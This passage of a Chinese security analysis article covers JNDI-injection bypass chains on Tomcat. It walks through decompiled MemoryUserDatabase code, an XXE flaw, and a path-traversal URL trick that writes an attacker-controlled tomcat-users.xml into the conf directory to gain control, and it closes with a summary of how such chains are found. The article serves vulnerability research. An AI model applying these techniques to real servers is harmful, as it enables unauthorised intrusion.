    
12.   `try {`
    
13.   `//请求url并获取内容`
    
14.   `URL url = uri.toURL();`
    
15.   `uConn = url.openConnection();`
    
16.   `InputStream is = uConn.getInputStream();`
    
17.   `this.lastModified = uConn.getLastModified();`
    
18.   `Digester digester = new Digester();`
    
19.   `try {`
    
20.   `digester.setFeature("http://apache.org/xml/features/allow-java-encodings", true);`
    
21.   `} catch (Exception var28) {`
    
22.   `log.warn(sm.getString("memoryUserDatabase.xmlFeatureEncoding"), var28);`
    
23.   `}`
    
24.   `digester.addFactoryCreate("tomcat-users/group", new MemoryGroupCreationFactory(this), true);`
    
25.   `digester.addFactoryCreate("tomcat-users/role", new MemoryRoleCreationFactory(this), true);`
    
26.   `digester.addFactoryCreate("tomcat-users/user", new MemoryUserCreationFactory(this), true);`
    
27.   `//解析请求后的内容`
    
28.   `digester.parse(is);`
    
29.   `} catch (IOException var29) {`
    
30.   `log.error(sm.getString("memoryUserDatabase.fileNotFound", new Object[]{pathName}));`
    
31.   `} catch (Exception var30) {`
    
32.   `this.users.clear();`
    
33.   `this.groups.clear();`
    
34.   `this.roles.clear();`
    
35.   `throw var30;`
    
36.   `} finally {`
    
37.   `if (uConn != null) {`
    
38.   `try {`
    
39.   `uConn.getInputStream().close();`
    
40.   `} catch (IOException var27) {`
    
41.   `log.warn(sm.getString("memoryUserDatabase.fileClose", new Object[]{this.pathname}), var27);`
    
42.   `}`
    
43.   `}`
    
44.   `}`
    
45.   `} finally {`
    
46.   `this.writeLock.unlock();`
    
47.   `}`
    
48.   `}`
    


```

而在parse的过程中会对获取到的xml解析,因此存在xxe漏洞。

```


1.  `public Object parse(InputStream input) throws IOException, SAXException {`
    
2.   `this.configure();`
    
3.   `InputSource is = new InputSource(input);`
    
4.   `this.getXMLReader().parse(is);`
    
5.   `return this.root;`
    
6.   `}`
    


```

![](https://mmbiz.qpic.cn/mmbiz_png/ofBa42GG7SjtsAibXhcFloZMbDdibhKrDQEVjmhzDhXnepHCFPDGvjoJL1NgVbBZlxzqn0Z9noLacN7ibvej87aug/640?wx_fmt=png)

### RCE

前面也说过`MemoryUserDatabase`存储了Tomcat的用户信息并且会存储到xml，那么我们也知道tomcat中的用户信息是在`tomcat- users.xml`中的，所以是否我们直接在xml中构建一个我们已知账号密码的xml，让其加载。

在open方法加载远程xml并解析后，如果readonly属性我们设置为false会进入save方法保存xml。

save方法首先判断isWriteable是否为true,否则直接返回

```


1.  `public void save() throws Exception {`
    
2.   `if (this.getReadonly()) {`
    
3.   `log.error(sm.getString("memoryUserDatabase.readOnly"));`
    
4.   `//判断isWriteable是否为true，否则直接返回`
    
5.   `} else if (!this.isWriteable()) {`
    
6.   `log.warn(sm.getString("memoryUserDatabase.notPersistable"));`
    
7.   `} else {`
    
8.   `File fileNew = new File(this.pathnameNew);`
    
9.   `if (!fileNew.isAbsolute()) {`
    
10.   `fileNew = new File(System.getProperty("catalina.base"), this.pathnameNew);`
    
11.   `}`
    


```

在`isWriteable`中会将`catalina.base`和`pathname`拼接并判断其目录是否存在如果不存在则返回false。可以看到我们的url地址被处理为`\http:\127.0.0.1\tomcat- user.xml`这种形式，所以我们可以通过`[http://127.0.0.1/../../tomcat- user.xml](http://127.0.0.1/../../tomcat-user.xml)`来绕过，也不会影响xml的加载。

![](https://mmbiz.qpic.cn/mmbiz_png/ofBa42GG7SjtsAibXhcFloZMbDdibhKrDQZP0WAw3D4Plt3yWRicZ05xFn2HcialbPGibS0tcBRibiaH1EtjvBuyTPIZQ/640?wx_fmt=png)

后面就是执行xml文件写入的功能，可以看到执行完后用户的配置文件已经写入到目标目录下，由于真正的配置是在conf目录下的，所以url中还要加个conf目录。

![](https://mmbiz.qpic.cn/mmbiz_png/ofBa42GG7SjtsAibXhcFloZMbDdibhKrDQDKFVM02AsAWZf4k5GePiaQPQKfoVKA4fbaUYbHIbYd1A1CSKQzbyHaw/640?wx_fmt=png)

但是这种绕过方式和Tomcat的版本有关，在Tomcat8的open方法中是通过`ConfigFileLoader.getURI(pathName);`来获取xml的是可以加载远程XML的。

![](https://mmbiz.qpic.cn/mmbiz_png/ofBa42GG7SjtsAibXhcFloZMbDdibhKrDQ3B41rfRkFqWXc4JC0Fcr8zdz3iaKM4AhxtpcHL2tGtZ64lLnK8cIUOQ/640?wx_fmt=png)

在Tomcat7版本中open方法中是通过`ConfigFileLoader.getInputStream(pathName);`获取的。

![](https://mmbiz.qpic.cn/mmbiz_png/ofBa42GG7SjtsAibXhcFloZMbDdibhKrDQcPG9pmpibLQa5URHubv7QITiaPstYgE6Gqs0DUovBVmibqmJzFYZ1W3NA/640?wx_fmt=png)

在`getInputStream`中首先通过file协议加载加载失败才会通过URL记载，所以这种利用方式似乎不能用在Tomcat7的版本，但是高版本的利用本身也有EL表达式，因此`MemoryUserDatabaseFactory`利用链似乎  
有些鸡肋，但是从学习的角度来看还是很有价值的。

![](https://mmbiz.qpic.cn/mmbiz_png/ofBa42GG7SjtsAibXhcFloZMbDdibhKrDQ4xWCX5gKZ2w1yicTzL8NOSDOSqUX4icic3ckVQiazrZ6nH4TibIzkB9aomw/640?wx_fmt=png)

总结
--

本文讨论的绕过主要是针对Tomcat下的利用，大多数的利用方式建立在tomcat的BeanFactory利用之上，通过上面的分析，我们对这些利用链的发现思路做一个总结。

*   寻找可以执行命令的函数，可以直接传入一个string参数执行命令（EL、MVEL、Groovy、Beanshell）
    
*   寻找UrlClassLoader，但是这种除了GroovyClassLoader比较特殊会在加载的过程中执行命令，其他实现UrlClassLoader的类加载后并不会实例化
    
*   已知存在漏洞的组件，可以直接传入String参数利用后间接执行命令(Xstrem、snakeyaml)
    

我们从利用的角度再思考一下，目前挖掘这么多利用链的方式其实主要是想解决tomcat低版本下的绕过，虽然Tomcat原生的`MemoryUserDatabaseFactory`利用链非常精彩，不过很遗憾在Tomcat7也不能使用。目前还是只能依赖一些命令执行或者存在漏洞的组件来利用，并不具备通用性。最后感谢`浅蓝`师傅的分享。

参考
--

探索高版本 JDK 下 JNDI 漏洞的利用方法

浅析JNDI注入Bypass